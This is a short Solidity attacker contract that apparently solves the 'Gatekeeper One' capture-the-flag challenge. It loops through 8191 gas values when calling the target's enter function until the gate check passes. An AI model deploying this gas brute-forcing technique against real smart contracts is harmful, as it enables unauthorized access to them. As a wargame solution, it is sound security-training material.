// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

interface IGatekeeperOne {
    function enter(bytes8 _key) external returns (bool);
}

contract GatekeeperOneAttacker {
    IGatekeeperOne public gatekeeperOne;

    constructor(address _gatekeeperOne) {
        gatekeeperOne = IGatekeeperOne(_gatekeeperOne);
    }

    function attack(bytes8 _key) external returns (bool) {
        for (uint i = 0; i < 8191; i++) {
            try gatekeeperOne.enter{gas: 819100 + i}(_key) {
                return gatekeeperOne.enter{gas: 819100 + i}(_key);
            } catch {
                continue;
            }
        }
        return false;
    }
}